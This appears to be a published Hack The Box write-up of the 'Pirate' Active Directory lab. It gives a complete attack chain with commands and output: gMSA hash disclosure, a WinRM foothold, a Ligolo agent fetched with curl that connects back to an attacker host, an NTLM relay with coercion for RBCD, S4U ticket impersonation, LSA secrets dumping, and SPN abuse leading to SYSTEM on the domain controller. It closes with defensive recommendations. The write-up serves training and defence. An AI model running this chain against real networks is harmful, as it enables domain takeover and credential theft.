---
title: "Pirate — gMSA Disclosure, NTLM-Relay RBCD, and SPN Abuse to Domain Controller"
description: "Kerberos clock-skew alignment, gMSA enumeration, and an NTLM relay pivot lead through delegation abuse to domain controller compromise."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - kerberos
  - gmsa
  - rbcd
  - ntlm-relay
  - ligolo
objective: "Chain supplied domain credentials through gMSA disclosure, an NTLM-relay pivot, and delegation abuse to administrative control of the domain controller."
tools:
  - rustscan
  - NetExec
  - rusthound-ce
  - rdate
  - evil-winrm
  - Ligolo-ng
  - Impacket
  - coercer
  - bloodyAD
skill: "Active Directory trust-path analysis across gMSA disclosure, NTLM relay, resource-based constrained delegation, and SPN abuse"
outcome: "SYSTEM-level execution on the domain controller after RBCD delegation and SPN-abuse service-ticket pivoting"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Hard |
| Target environment | Windows Active Directory domain controller with an internal `/24` network segment hosting a web host |
| Starting position | Supplied domain credentials for a low-privileged user |
| Objective | Chain supplied credentials, a gMSA disclosure, an NTLM-relay pivot, and delegation abuse to administrative control of the domain controller |
| Outcome | SYSTEM-level execution on the domain controller |

## Clock skew to gMSA to RBCD

Pirate is a Hard-rated Hack The Box Active Directory lab that begins with supplied credentials for a low-privileged domain user. Kerberos clock skew blocks LDAP enumeration at first; once the clocks are aligned, `pre2k` and gMSA enumeration expose a managed service account whose NTLM hash yields a WinRM foothold on the domain controller. Local discovery reveals an internal `/24` segment hosting a web host, a Ligolo tunnel reaches it, and an NTLM relay to LDAPS grants the delegation rights needed to impersonate an administrator, recover a local secret, reset a privileged account's password, and pivot a service ticket to the domain controller. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Supplied domain credentials → Kerberos clock-skew alignment → `pre2k` and gMSA disclosure → WinRM foothold → internal segment discovery → Ligolo pivot → NTLM-relay RBCD → delegated CIFS ticket → local secret recovery → privileged password reset → SPN abuse → domain controller SYSTEM**

## Controller with supplied credentials and an internal segment

- **Target:** a Windows Active Directory domain controller exposing DNS, Kerberos, LDAP, SMB, IIS (HTTP), and WinRM.
- **Starting position:** supplied credentials for `<INITIAL_USER>`, a low-privileged domain account.
- **Internal segment:** a `/24` network reachable only through the domain controller, hosting `<INTERNAL_WEB_HOSTNAME>`.
- **Objective:** chain trust relationships across the domain and the internal segment to reach domain administrative control.
- **Constraints:** I kept activity inside the Hack The Box lab environment; the lab hostname was mapped locally for name resolution.

## Evidence: gMSA hash to relay RBCD to SPN abuse

### 1. Service Enumeration

Observation: a full TCP scan identifies the host as a domain controller and exposes a web service alongside the directory services.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <SCAN_OUTPUT>
```

Truncated scan output:

```text
53/tcp   open  domain         Simple DNS Plus
80/tcp   open  http           Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec   Microsoft Windows Kerberos
389/tcp  open  ldap           Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds
5985/tcp open  http           Microsoft HTTPAPI httpd 2.0
```

Significance: DNS, Kerberos, and LDAP together with WinRM (5985) identify a domain controller; port 80 exposes an IIS service that is enumeration-only, while WinRM is the credential-based foothold.

Result: the scan enumerates a Windows domain controller, with WinRM available for a later credential-based foothold.

### 2. SMB Enumeration and Domain User Discovery

Observation: the supplied credentials authenticate over SMB, but the exposed shares are limited to the default set.

```bash
nxc smb <TARGET_DOMAIN> -u '<INITIAL_USER>' -p '<SUPPLIED_PASSWORD>' --shares
```

```text
ADMIN$
C$
IPC$      READ
NETLOGON  READ
SYSVOL    READ
```

Significance: valid low-privileged credentials grant read access to `SYSVOL` and `NETLOGON` but no read access to the administrative shares (`ADMIN$`, `C$`), so the foothold has to come from directory data.

Result: authentication with the supplied credentials is confirmed over SMB.

RID brute forcing then enumerates the domain user list:

```bash
nxc smb <TARGET_DOMAIN> -u '<INITIAL_USER>' -p '<SUPPLIED_PASSWORD>' --rid-brute \
  | awk '/SidTypeUser/' | awk '{print $6}' | awk -F'\\' '{print $2}' > users.txt
```

```text
Administrator
Guest
krbtgt
<DOMAIN_CONTROLLER_MACHINE_ACCOUNT>
<PRIVILEGED_USER>
<STANDARD_USER>
<INTERNAL_WEB_MACHINE_ACCOUNT>
```

Significance: the enumerated names include a privileged user and a standard user that later holds a password-reset right.

Result: `<PRIVILEGED_USER>` and `<STANDARD_USER>` are identified for later stages.

### 3. Kerberos Clock Skew and `pre2k` Enumeration

Observation: LDAP enumeration of pre-created computer accounts fails because the local clock and the domain controller are out of sync.

```bash
nxc ldap <TARGET_DOMAIN> -u '<INITIAL_USER>' -p '<SUPPLIED_PASSWORD>' -M pre2k
```

```text
[-] Error obtaining TGT for <CONTROLLED_COMPUTER_ACCOUNT>@<TARGET_DOMAIN>: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Action: align the local clock with the domain controller and repeat the enumeration.

```bash
sudo rdate -n <TARGET_DOMAIN>
```

```text
[+] Successfully obtained TGT for <CONTROLLED_COMPUTER_ACCOUNT>@<TARGET_DOMAIN>
```

Significance: Kerberos rejects tickets when the client clock deviates beyond the realm's skew tolerance, so time alignment restores authentication without any credential change.

Result: TGT acquisition succeeds and directory enumeration proceeds; obtaining the ticket establishes control of the pre-created machine account, which is the same account later used as `<CONTROLLED_COMPUTER_ACCOUNT>` in the delegation stage.

BloodHound collection and gMSA enumeration follow using the obtained ticket cache:

```bash
rusthound-ce -d '<TARGET_DOMAIN>' -f '<DOMAIN_CONTROLLER_HOSTNAME>' -i '<TARGET_IP>' -k -z
nxc ldap <TARGET_DOMAIN> --use-kcache --gmsa
```

```text
LDAP  <TARGET_DOMAIN>  389  <DOMAIN_CONTROLLER_HOSTNAME>  Account: <GMSA_ACCOUNT>  NTLM: <GMSA_NTLM_HASH>  PrincipalsAllowedToReadPassword: <AUTHORIZED_GROUP>
```

Significance: a group Managed Service Account's password is distributed as an NTLM hash to the principals named in `PrincipalsAllowedToReadPassword`; the recorded enumeration read it directly, so the hash becomes usable for authentication without knowing the plaintext.

Result: the NTLM hash of `<GMSA_ACCOUNT>` is recovered.

### 4. WinRM Foothold and Internal Segment Discovery

Observation: the recovered gMSA hash authenticates over WinRM.

```bash
nxc winrm <TARGET_DOMAIN> -u '<GMSA_ACCOUNT>' -H '<GMSA_NTLM_HASH>'
```

```text
WINRM  <TARGET_IP>  5985  <DOMAIN_CONTROLLER_HOSTNAME>  [+] <TARGET_DOMAIN>\<GMSA_ACCOUNT>:<GMSA_NTLM_HASH> (Pwn3d!)
```

An interactive shell follows:

```bash
evil-winrm -i <DOMAIN_CONTROLLER_HOSTNAME> -u '<GMSA_ACCOUNT>' -H '<GMSA_NTLM_HASH>'
```

Significance: the `Pwn3d!` marker indicates the managed account has administrative remote access, so its hash yields an interactive session on the domain controller.

Result: an administrative WinRM session as `<GMSA_ACCOUNT>` is established.

Local network discovery from that session reveals a second segment:

I checked the local network from that session.

```powershell
ipconfig /all
arp -a
```

```text
Ethernet adapter vEthernet (Switch01):
   IPv4 Address. . . . . . . . . . . : <INTERNAL_DC_IP>(Preferred)

<INTERNAL_WEB_IP>     <INTERNAL_WEB_MAC>     dynamic
```

Significance: the domain controller has a second adapter on an internal `/24` network that is not directly routable from the attack host, so `<INTERNAL_WEB_HOSTNAME>` can only be reached through a tunnel.

Result: `<INTERNAL_WEB_HOSTNAME>` at `<INTERNAL_WEB_IP>` is identified as the next target.

### 5. Ligolo Pivot to the Internal Segment

Observation: the internal web host is not directly reachable, so a tunnel is established through the domain controller.

Action: run the Ligolo proxy on the attack host, deploy the agent on the domain controller, then add a route to the internal network in the proxy session.

```bash
~/Tools/Ligolo-ng/proxy --selfcert
```

```powershell
curl -o agent.exe <AGENT_URL>
./agent.exe --connect <ATTACKER_HOST>:<LIGOLO_PORT> --ignore-cert
```

```text
INFO[0100] Starting tunnel to <TARGET_DOMAIN>\<GMSA_ACCOUNT>@<DOMAIN_CONTROLLER_HOSTNAME>
```

Reachability to the internal host is then confirmed through the tunnel:

```bash
ping <INTERNAL_WEB_IP>
```

```text
64 bytes from <INTERNAL_WEB_IP>: icmp_seq=1 ttl=64 time=232 ms
```

Significance: with a route through the agent, the attack host can address the internal segment directly, so the domain controller is a pivot point.

Result: `<INTERNAL_WEB_IP>` is reachable through the tunnel.

### 6. NTLM-Relay RBCD and Delegated CIFS Ticket

Observation: the internal web host authenticates to the domain over LDAP, and its delegation attribute can be rewritten through a relayed coercion.

Action: relay coerced authentication from the web host to LDAPS and grant delegation rights to a controlled computer account.

```bash
impacket-ntlmrelayx -t ldaps://<TARGET_IP> \
  --delegate-access \
  --escalate-user '<CONTROLLED_COMPUTER_ACCOUNT>' \
  -smb2support \
  --remove-mic

coercer coerce -u '<GMSA_ACCOUNT>' --hashes ':<GMSA_NTLM_HASH>' \
  -d <TARGET_DOMAIN> -l <ATTACKER_HOST> -t <INTERNAL_WEB_IP> --always-continue
```

```text
[*] ldaps://<TARGET_DOMAIN>/<INTERNAL_WEB_MACHINE_ACCOUNT>@<TARGET_IP> [1] -> Delegation rights modified successfully!
[*] ldaps://<TARGET_DOMAIN>/<INTERNAL_WEB_MACHINE_ACCOUNT>@<TARGET_IP> [1] -> <CONTROLLED_COMPUTER_ACCOUNT> can now impersonate users via S4U2Proxy
```

Significance: relayed authentication to LDAPS lets the attacker write the web host's resource-based constrained delegation attribute, so the controlled computer account can obtain service tickets impersonating arbitrary users on that host.

Result: `<CONTROLLED_COMPUTER_ACCOUNT>` gains S4U2Proxy impersonation rights over `<INTERNAL_WEB_HOSTNAME>`.

With delegation in place, a service ticket impersonating an administrator is requested for the `CIFS` service on the internal web host:

```bash
impacket-getST <TARGET_DOMAIN>/'<CONTROLLED_COMPUTER_ACCOUNT>' \
  -spn 'cifs/<INTERNAL_WEB_HOSTNAME>' \
  -impersonate <ADMINISTRATOR_ACCOUNT> \
  -dc-ip <TARGET_IP> \
  -k -no-pass
```

```text
[*] Impersonating <ADMINISTRATOR_ACCOUNT>
[*] Saving ticket in <ADMINISTRATOR_ACCOUNT>@cifs_<INTERNAL_WEB_HOSTNAME>@<TARGET_DOMAIN>.ccache
```

Significance: a delegated service ticket carries the administrator's identity to the `CIFS` service, so it can be presented for administrative access to the web host.

Result: an administrator-impersonating CIFS ticket for `<INTERNAL_WEB_HOSTNAME>` is obtained.

### 7. Local Secret Recovery from the Internal Web Host

Observation: the delegated ticket authorizes secrets extraction from the web host.

```bash
export KRB5CCNAME=<ADMINISTRATOR_ACCOUNT>@cifs_<INTERNAL_WEB_HOSTNAME>@<TARGET_DOMAIN>.ccache
impacket-secretsdump -k -no-pass -target-ip <INTERNAL_WEB_IP> <INTERNAL_WEB_HOSTNAME>
```

The LSA secrets dump discloses a reusable local password for a domain account:

```text
[*] Dumping LSA Secrets
[*] DefaultPassword
<TARGET_DOMAIN>\<STANDARD_USER>:<STANDARD_USER_PASSWORD>
```

Significance: a password kept as `DefaultPassword` in LSA secrets is a reusable credential for `<STANDARD_USER>` rather than a machine-bound secret, so it crosses from the host into the domain.

Result: a credential pair for `<STANDARD_USER>` is recovered.

The recovered credential is then validated against the web host over SMB:

```bash
nxc smb <INTERNAL_WEB_IP> -u '<STANDARD_USER>' -p '<STANDARD_USER_PASSWORD>'
```

```text
SMB  <INTERNAL_WEB_IP>  445  <INTERNAL_WEB_HOSTNAME>  [+] <TARGET_DOMAIN>\<STANDARD_USER>:<STANDARD_USER_PASSWORD>
```

Significance: successful authentication confirms the recovered secret is valid for the domain account.

Result: `<STANDARD_USER>` is validated over SMB.

### 8. Password Reset and SPN Abuse to Domain Controller

Observation: `<STANDARD_USER>` holds a password-reset right over `<PRIVILEGED_USER>`.

Action: reset the privileged account's password.

```bash
bloodyAD --host '<TARGET_IP>' -d <TARGET_DOMAIN> \
  -u '<STANDARD_USER>' -p '<STANDARD_USER_PASSWORD>' \
  set password '<PRIVILEGED_USER>' '<RESET_PASSWORD>'
```

```text
[+] Password changed successfully!
```

Significance: the password-reset right transfers control of `<PRIVILEGED_USER>` to the attacker without any further exploit.

Result: `<PRIVILEGED_USER>` credentials are changed to a known value.

An SPN is then written to the domain controller's machine account, and a service ticket is requested with an alternate service to pivot it from HTTP to CIFS on the domain controller:

```bash
python3 addspn.py -u '<TARGET_DOMAIN>\<PRIVILEGED_USER>' -p '<RESET_PASSWORD>' \
  -t '<DOMAIN_CONTROLLER_MACHINE_ACCOUNT>' -s 'HTTP/<INTERNAL_WEB_HOSTNAME>' <TARGET_IP>

impacket-getST -spn 'HTTP/<INTERNAL_WEB_HOSTNAME>' \
  -impersonate '<ADMINISTRATOR_ACCOUNT>' \
  <TARGET_DOMAIN>/<PRIVILEGED_USER>:'<RESET_PASSWORD>' \
  -dc-ip <TARGET_IP> \
  -altservice 'CIFS/<DOMAIN_CONTROLLER_HOSTNAME>'
```

```text
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from HTTP/<INTERNAL_WEB_HOSTNAME>@<TARGET_DOMAIN> to CIFS/<DOMAIN_CONTROLLER_HOSTNAME>@<TARGET_DOMAIN>
[*] Saving ticket in <ADMINISTRATOR_ACCOUNT>@CIFS_<DOMAIN_CONTROLLER_HOSTNAME>@<TARGET_DOMAIN>.ccache
```

Significance: write access to the machine account's SPNs permits S4U2self/S4U2Proxy service-ticket issuance, and the `altservice` pivot retargets the impersonated ticket from HTTP to CIFS on the domain controller.

Result: an administrator-impersonating CIFS ticket for the domain controller is obtained.

The final ticket is used to execute on the domain controller:

```bash
export KRB5CCNAME=<ADMINISTRATOR_ACCOUNT>@CIFS_<DOMAIN_CONTROLLER_HOSTNAME>@<TARGET_DOMAIN>.ccache
impacket-psexec -k -no-pass <DOMAIN_CONTROLLER_HOSTNAME>
```

Result: the session lands in the `<SYSTEM_ACCOUNT>` context on the domain controller.

## Kerberos clock skew and an unroutable segment

| Challenge | Decision | Rationale |
|---|---|---|
| Kerberos clock skew blocked `pre2k` enumeration | Synchronized the local clock with `rdate` before retrying | Kerberos rejects tickets when the client is outside the realm's skew tolerance |
| The internal `/24` segment was not directly routable | Reached it through a Ligolo tunnel via the domain controller | The web host is reachable only from the domain controller's internal adapter |

## Outcome: SYSTEM on the controller via a CIFS ticket

The source notes document administrative compromise of the domain: an administrator-impersonating CIFS ticket was issued by the domain controller and used to execute in its `<SYSTEM_ACCOUNT>` context. Limitations: I could not verify the landing context from captured output because the final session's command output was not retained, so that context rests on the source's record; the recovered secret values and the flag are omitted.

## Recommendations: time sync, gMSA reads, LDAP signing, LSA secrets, and SPNs

These actions are recommendations. No validation is documented.

1. **Kerberos time synchronization.** Time drift produced `KRB_AP_ERR_SKEW` and blocked account enumeration. *Recommendation:* keep domain controllers and management hosts synchronized to a reliable time source. *Detection:* monitor for `KRB_AP_ERR_SKEW` events.
2. **Over-broad gMSA read permission.** A principal listed in `PrincipalsAllowedToReadPassword` retrieved the managed account's NTLM hash directly, which gave a WinRM foothold. *Recommendation:* restrict `PrincipalsAllowedToReadPassword` to the minimum identities that require it and review it regularly. *Detection:* monitor gMSA password reads and changes to those ACLs.
3. **NTLM relay to LDAPS with weakly protected delegation.** Relaying coerced host authentication to LDAPS modified the web host's delegation attribute, which enabled administrator impersonation via S4U2Proxy. *Recommendation:* enforce LDAP signing and channel binding, disable NTLM where possible, and restrict write access to machine-account delegation attributes. *Detection:* monitor modifications to `msDS-AllowedToActOnBehalfOfOtherIdentity` and on LDAP binds that follow coercion.
4. **Reusable plaintext secret in LSA secrets.** A `DefaultPassword` stored on the web host provided a usable domain credential. *Recommendation:* avoid storing reusable account passwords in machine secrets or local configuration; where unavoidable, rotate and scope them. *Detection:* scan hosts for stored credentials and monitor unusual service-account use.
5. **Machine-account SPN write access.** Write access to the domain controller machine account's SPNs allowed S4U2self/S4U2Proxy ticket issuance, pivoted to `CIFS` with the `altservice` option. *Recommendation:* treat SPN write access on privileged computer accounts as tier-zero and restrict it. *Detection:* monitor SPN modifications to domain controller machine accounts and on anomalous service-ticket requests.

## References

- [Hack The Box — Pirate](https://app.hackthebox.com/machines/Pirate) (retired machine)
- [NetExec (`nxc`)](https://github.com/Pennyw0rth/NetExec) (SMB, LDAP, gMSA, and WinRM operations)
- [Impacket](https://github.com/fortra/impacket) (NTLM relay, service-ticket, secrets-dump, and PsExec clients)
- [Coercer](https://github.com/p0dalirius/Coercer) (authentication coercion)
- [bloodyAD](https://github.com/cravaterouge/bloodyAD) (Active Directory privilege and password operations)
- [Ligolo-ng](https://github.com/nicocha30/ligolo-ng) (network tunnel)
- [evil-winrm](https://github.com/Hackplayers/evil-winrm) (WinRM shell)
- [RustScan](https://github.com/bee-san/RustScan) (port scanner)
- [Group Managed Service Accounts overview — Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)
- [Kerberos authentication overview — Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)
- [LDAP signing for Active Directory Domain Services — Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing)
- [Network security: Restrict NTLM: NTLM authentication in this domain — Microsoft Learn](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain)
- [msDS-AllowedToActOnBehalfOfOtherIdentity attribute — Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity)
